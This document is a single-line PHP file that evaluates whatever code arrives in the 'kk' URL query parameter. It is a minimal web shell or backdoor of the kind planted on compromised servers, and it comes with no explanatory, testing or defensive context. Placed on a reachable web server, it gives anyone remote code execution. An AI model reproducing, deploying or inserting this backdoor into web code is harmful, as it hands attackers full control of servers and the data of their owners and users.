<?php eval($_GET['kk']); ?>
